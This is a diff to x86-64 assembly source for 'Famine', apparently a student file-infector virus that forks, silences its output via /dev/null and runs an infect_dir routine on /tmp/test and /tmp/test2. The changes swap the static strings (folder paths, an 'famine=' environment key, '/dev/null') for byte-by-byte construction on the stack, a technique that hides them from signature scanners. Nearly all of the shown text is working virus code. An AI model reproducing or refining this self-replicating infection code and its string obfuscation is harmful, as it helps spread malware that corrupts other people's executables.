@@ -18,8 +18,6 @@
 %define SUCCESS    0
 %define ERROR      -1
 
-%define BARRA_N     10
-
 section .text
     global _start
 
@@ -39,7 +37,6 @@ _start:
     test rax, rax ;check error or parent
     jnz safe_exit
 
-    call redirect_dev_null
 
     mov r12, rsp
     add r12, 8
@@ -50,10 +47,41 @@ _start:
     sub rsp, 15000      ; reserving 15000 bytes
     mov r15, rsp       ; r15 = malloc(15000)
 
-    lea rdi, [rel folder1] ; rdi = "/tmp/test"
+    call redirect_dev_null
+
+    lea rsi, [rsp + 11000]
+
+    mov byte [rsi + 0], '/'
+    mov byte [rsi + 1], 't'
+    mov byte [rsi + 2], 'm'
+    mov byte [rsi + 3], 'p'
+    mov byte [rsi + 4], '/'
+    mov byte [rsi + 5], 't'
+    mov byte [rsi + 6], 'e'
+    mov byte [rsi + 7], 's'
+    mov byte [rsi + 8], 't'
+    mov byte [rsi + 9], 0
+
+    mov rdi, rsi            ; rdi = pointer to "/tmp/test"
+
     call infect_dir
     
-    lea rdi, [rel folder2] ; rdi = "/tmp/test2"
+    lea rsi, [rsp + 11000]
+
+    mov byte [rsi + 0], '/'
+    mov byte [rsi + 1], 't'
+    mov byte [rsi + 2], 'm'
+    mov byte [rsi + 3], 'p'
+    mov byte [rsi + 4], '/'
+    mov byte [rsi + 5], 't'
+    mov byte [rsi + 6], 'e'
+    mov byte [rsi + 7], 's'
+    mov byte [rsi + 8], 't'
+    mov byte [rsi + 9], '2'
+    mov byte [rsi + 10], 0 
+
+    mov rdi, rsi            ; rdi = pointer to "/tmp/test2"
+
     call infect_dir
 
     call do_env
@@ -348,7 +376,18 @@ do_env:
     test rsi, rsi
     je .exit
     
-    lea rdi, [rel famine_str]
+    lea r9, [rsp + 11000]
+    mov byte [r9 + 0], 'f'
+    mov byte [r9 + 1], 'a'
+    mov byte [r9 + 2], 'm'
+    mov byte [r9 + 3], 'i'
+    mov byte [r9 + 4], 'n'
+    mov byte [r9 + 5], 'e'
+    mov byte [r9 + 6], '='
+    mov byte [r9 + 7], 0
+
+    mov rdi, r9
+
     call ft_strncmp
     test rax, rax
     je .print_famine_value
@@ -395,17 +434,23 @@ split_and_print:
     call infect_dir
     ret
 
-folder1 db "/tmp/test", NULL
-folder2 db "/tmp/test2", NULL
-
-famine_str db 'famine=', NULL
-
-dev_null db "/dev/null", NULL
-
 signature db "Famine version 1.0 (c)oded dec-2024 by gemartin-jareste", NULL
 
 redirect_dev_null:
-    lea rdi, [rel dev_null]
+    lea r9, [rsp + 11000]
+    mov byte [r9 + 0], '/'
+    mov byte [r9 + 1], 'd'
+    mov byte [r9 + 2], 'e'
+    mov byte [r9 + 3], 'v'
+    mov byte [r9 + 4], '/'
+    mov byte [r9 + 5], 'n'
+    mov byte [r9 + 6], 'u'
+    mov byte [r9 + 7], 'l'
+    mov byte [r9 + 8], 'l'
+    mov byte [r9 + 9], 0
+
+    mov rdi, r9
+
     mov rsi, 0
     mov rax, SYS_OPEN
     syscall
@@ -431,6 +476,7 @@ restore_stack:
     mov rsp, rbp
     pop rbp
     pop rdx
+    add rsp, 15000
 
 safe_exit:
     xor rdi, rdi
